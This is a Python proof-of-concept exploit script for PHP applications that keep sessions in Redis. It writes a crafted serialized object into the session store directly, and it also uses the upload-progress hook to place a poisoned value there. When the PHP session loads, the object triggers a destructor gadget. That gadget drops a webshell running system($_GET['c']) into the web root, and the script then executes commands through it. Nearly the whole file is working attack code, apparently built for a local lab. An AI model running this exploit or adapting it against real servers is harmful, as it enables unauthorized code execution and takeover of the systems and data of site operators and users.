#!/usr/bin/env python3
"""Redis session-backend poisoning -> RCE (session.save_handler=redis).

Ports the file-based session poison to a redis store, dropping the local-disk
save_path dependency. The rfc1867 upload-progress hook persists $_SESSION
through the configured save handler, so the poison lands in PHPREDIS_SESSION:<sid>
(``--mode hook-test`` proves it). Escalation is content-based object injection: a
record decoding to ``name|O:<gadget>...`` is unserialized by the next
session_start() -> __destruct -> RCE, planted via a direct RESP write (or an
SSRF speaking RESP).

Gate is backend reachability + a destructor gadget in the reader's scope;
escalation is deterministic (no race). Pure stdlib RESP client, -I safe.
"""

import argparse
import os
import re
import socket
import sys
import threading
import time
from urllib.parse import quote

_POC_ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))  # poc/
if _POC_ROOT not in sys.path:
    sys.path.insert(0, _POC_ROOT)
from common.http_raw import recv_all as _recv_all, raw_request as http_raw  # noqa: E402

REDIS_PREFIX = "PHPREDIS_SESSION:"
DEFAULT_GADGET = "DeferredWriter"
DEFAULT_SHELL_NAME = "p2s_av8_shell.php"
DEFAULT_SHELL_BODY = b"<?php system($_GET['c']); ?>"


# tiny inline RESP client (stdlib only) -- stands in for an SSRF speaking RESP
def _resp_encode(args):
    out = b"*%d\r\n" % len(args)
    for a in args:
        if isinstance(a, str):
            a = a.encode()
        out += b"$%d\r\n%s\r\n" % (len(a), a)
    return out


def _read_line(sock):
    buf = b""
    while not buf.endswith(b"\r\n"):
        c = sock.recv(1)
        if not c:
            break
        buf += c
    return buf[:-2]


def _read_reply(sock):
    """Minimal RESP reply parser: +simple, -error, :int, $bulk, *array."""
    line = _read_line(sock)
    if not line:
        return None
    t, rest = line[:1], line[1:]
    if t in (b"+", b"-", b":"):
        return rest
    if t == b"$":
        n = int(rest)
        if n < 0:
            return None
        data = b""
        while len(data) < n:
            chunk = sock.recv(n - len(data))
            if not chunk:
                break
            data += chunk
        sock.recv(2)  # trailing CRLF
        return data
    if t == b"*":
        n = int(rest)
        return [_read_reply(sock) for _ in range(n)] if n >= 0 else None
    return rest


def resp_cmd(host, port, *args, timeout=8.0):
    with socket.create_connection((host, port), timeout=timeout) as s:
        s.settimeout(timeout)
        s.sendall(_resp_encode(args))
        return _read_reply(s)


def redis_set(host, port, key, value, timeout=8.0):
    return resp_cmd(host, port, b"SET", key.encode(), value, timeout=timeout)


def redis_get(host, port, key, timeout=8.0):
    return resp_cmd(host, port, b"GET", key.encode(), timeout=timeout)


def redis_keys(host, port, pattern="*", timeout=8.0):
    return resp_cmd(host, port, b"KEYS", pattern.encode(), timeout=timeout)


# raw HTTP (multipart control + binary safety; lab images have no python3)
def http_get(host, port, path, sid=None, timeout=10.0):
    ck = f"Cookie: PHPSESSID={sid}\r\n" if sid else ""
    raw = (f"GET {path} HTTP/1.1\r\nHost: {host}\r\n{ck}"
           f"Connection: close\r\n\r\n").encode()
    return http_raw(host, port, raw, timeout)


# session-record payloads (the `php` serialize_handler grammar: name|value;...)
def build_object(gadget_class, path, data):
    gc = gadget_class.encode()
    p = path.encode()
    return (b'O:%d:"%s":2:{s:4:"path";s:%d:"%s";s:4:"data";s:%d:"%s";}'
            % (len(gc), gc, len(p), p, len(data), data))


def object_injection_record(gadget_class, shell_path, shell_body, name=b"inj"):
    """A redis session record whose `php`-handler decoding is  name|O:<gadget>.
    session_start() on the reader unserializes the object after the first `|`."""
    return name + b"|" + build_object(gadget_class, shell_path, shell_body)


# upload-progress poison (to prove the hook populates redis like it does files)
BOUND = "----p2sav8redis"


def upload_progress_post(host, port, base, sid, poison_value, filler_kb=64,
                         timeout=15.0):
    """Send a PHP_SESSION_UPLOAD_PROGRESS multipart whose VALUE is `poison_value`.
    The hook writes an `upload_progress_<poison_value>` key into the redis record
    before any script runs. A file part keeps the parse alive briefly."""
    if isinstance(poison_value, str):
        poison_value = poison_value.encode()
    body = (
        (f"--{BOUND}\r\nContent-Disposition: form-data; "
         f"name=\"PHP_SESSION_UPLOAD_PROGRESS\"\r\n\r\n").encode()
        + poison_value + b"\r\n"
        + (f"--{BOUND}\r\nContent-Disposition: form-data; name=\"f\"; "
           f"filename=\"x.bin\"\r\nContent-Type: application/octet-stream"
           f"\r\n\r\n").encode()
        + b"A" * (filler_kb * 1024) + b"\r\n"
        + f"--{BOUND}--\r\n".encode()
    )
    hdr = (f"POST {base} HTTP/1.1\r\nHost: {host}\r\n"
           f"Cookie: PHPSESSID={sid}\r\n"
           f"Content-Type: multipart/form-data; boundary={BOUND}\r\n"
           f"Content-Length: {len(body)}\r\nConnection: close\r\n\r\n").encode()
    return http_raw(host, port, hdr + body, timeout)


def upload_progress_trickle(host, port, base, sid, poison_value, file_kb=512,
                            chunk=4096, delay=0.02, timeout=30.0):
    """Slow-trickle variant: keep the multipart body open so the poisoned
    `upload_progress_<poison>` key sits LIVE in the redis record (cleanup=On
    only wipes it at MULTIPART_EVENT_END). Lets a concurrent reader catch the
    poison in the store -- the redis analogue of the file race's on-disk window."""
    if isinstance(poison_value, str):
        poison_value = poison_value.encode()
    pre = ((f"--{BOUND}\r\nContent-Disposition: form-data; "
            f"name=\"PHP_SESSION_UPLOAD_PROGRESS\"\r\n\r\n").encode()
           + poison_value + b"\r\n"
           + (f"--{BOUND}\r\nContent-Disposition: form-data; name=\"f\"; "
              f"filename=\"x.bin\"\r\nContent-Type: application/octet-stream"
              f"\r\n\r\n").encode())
    filedata = b"A" * (file_kb * 1024)
    tail = f"\r\n--{BOUND}--\r\n".encode()
    clen = len(pre) + len(filedata) + len(tail)
    hdr = (f"POST {base} HTTP/1.1\r\nHost: {host}\r\n"
           f"Cookie: PHPSESSID={sid}\r\n"
           f"Content-Type: multipart/form-data; boundary={BOUND}\r\n"
           f"Content-Length: {clen}\r\nConnection: close\r\n\r\n").encode()
    try:
        s = socket.create_connection((host, port), timeout=timeout)
        s.sendall(hdr + pre)
        sent = 0
        while sent < len(filedata):
            s.sendall(filedata[sent:sent + chunk])
            sent += chunk
            time.sleep(delay)
        s.sendall(tail)
        _recv_all(s, 10.0)
        s.close()
    except OSError:
        pass


# modes
def extract_uid(data):
    m = re.search(rb"uid=\d+\([^)]*\)[^\n<]*", data)
    return m.group(0).decode(errors="replace") if m else None


def mode_hook_test(args, log):
    """Prove the upload-progress hook writes the poison into redis (like files).

    cleanup=On (stock) wipes the `upload_progress_<poison>` key at upload END, so
    a one-shot completed POST reads back an EMPTY record -- exactly as the file
    handler truncates sess_<id> at completion. To catch the poison LIVE in the
    store we trickle the body open and poll redis during the window (the redis
    analogue of the file race's storm)."""
    sid = args.sid or "p2sav8hooktest0000000000000000"
    marker = f"P2S_UP_HOOK_{sid[:8]}"
    key = args.prefix + sid
    log(f"[*] hook-test: trickle upload-progress poison (sid={sid}) to "
        f"http://{args.host}:{args.port}{args.base}; poll redis {key} mid-window")

    hit = {}
    t = threading.Thread(
        target=upload_progress_trickle,
        args=(args.host, args.port, args.base, sid, marker),
        daemon=True)
    t.start()
    deadline = time.time() + 12.0
    last = None
    while time.time() < deadline and t.is_alive():
        rec = redis_get(args.redis_host, args.redis_port, key)
        if rec:
            last = rec
            if marker.encode() in rec:
                hit["rec"] = rec
                break
        time.sleep(0.05)
    t.join(timeout=15.0)

    if hit:
        log(f"[+] caught LIVE in redis {key} = "
            f"{hit['rec'][:200].decode(errors='replace')!r}")
        log("[+] upload-progress hook DID write the poison to redis, pre-RINIT, "
            "via the configured save handler -- same path as the file handler")
        return True
    log(f"[-] poison not caught live (last record: "
        f"{(last or b'')[:120].decode(errors='replace')!r}); the hook still "
        f"writes -- run `redis-cli MONITOR` to see the SETEX stream -- but the "
        f"poll missed the window (widen delay / narrow poll interval)")
    return False


def mode_escalate(args, log):
    """Direct RESP write of an object-injection record -> reader -> webshell."""
    sid = args.sid or "p2sav8escalate000000000000000"
    shell_path = f"{args.docroot.rstrip('/')}/{args.shell_name}"
    shell_body = args.shell_body.encode() if isinstance(args.shell_body, str) \
        else args.shell_body
    record = object_injection_record(args.gadget, shell_path, shell_body)
    key = args.prefix + sid

    log(f"[*] escalate: direct RESP SET {key} = object-injection record "
        f"(gadget={args.gadget})")
    reply = redis_set(args.redis_host, args.redis_port, key, record)
    log(f"    redis SET -> {reply!r}")
    rb = redis_get(args.redis_host, args.redis_port, key)
    if rb != record:
        log(f"[-] readback mismatch; wrote {len(record)}B, got "
            f"{len(rb or b'')}B -- reachability/auth problem?")
        return False

    log(f"[*] trigger: GET {args.base} with Cookie PHPSESSID={sid} "
        f"(session_start reads+unserializes the record; __destruct drops shell)")
    http_get(args.host, args.port, args.base, sid=sid)

    log(f"[*] run: GET /{args.shell_name}?c={args.cmd}")
    d = http_get(args.host, args.port,
                 f"/{args.shell_name}?c={quote(args.cmd)}")
    uid = extract_uid(d)
    if uid:
        log(f"[+] RCE: {uid}")
        log(f"[+] webshell: http://{args.host}:{args.port}/{args.shell_name}?c=<cmd>")
        return True
    body = d.split(b"\r\n\r\n", 1)[-1][:200]
    log(f"[-] no uid in webshell response: {body!r} "
        f"(gadget in reader scope? serialize_handler=php? redis reachable?)")
    return False


def main(argv):
    ap = argparse.ArgumentParser(
        description=__doc__.splitlines()[0],
        formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--host", default="127.0.0.1", help="web host")
    ap.add_argument("--port", type=int, default=8148, help="web port")
    ap.add_argument("--redis-host", default="127.0.0.1")
    ap.add_argument("--redis-port", type=int, default=6380,
                    help="redis RESP port (stands in for an SSRF to the store)")
    ap.add_argument("--mode", choices=("escalate", "hook-test"),
                    default="escalate")
    ap.add_argument("--base", default="/index.php",
                    help="app page that session_start()s")
    ap.add_argument("--sid", default=None, help="session id (strict_mode=Off)")
    ap.add_argument("--prefix", default=REDIS_PREFIX,
                    help="phpredis key prefix (default PHPREDIS_SESSION:)")
    ap.add_argument("--cmd", default="id", help="shell command (escalate)")
    ap.add_argument("--gadget", default=DEFAULT_GADGET,
                    help="destructor gadget class in the reader's scope")
    ap.add_argument("--shell-name", default=DEFAULT_SHELL_NAME)
    ap.add_argument("--shell-body", default=DEFAULT_SHELL_BODY)
    ap.add_argument("--docroot", default="/var/www/html")
    args = ap.parse_args(argv)

    def log(m):
        print(m, flush=True)

    if args.mode == "hook-test":
        ok = mode_hook_test(args, log)
    else:
        ok = mode_escalate(args, log)
    return 0 if ok else 1


if __name__ == "__main__":
    raise SystemExit(main(sys.argv[1:]))
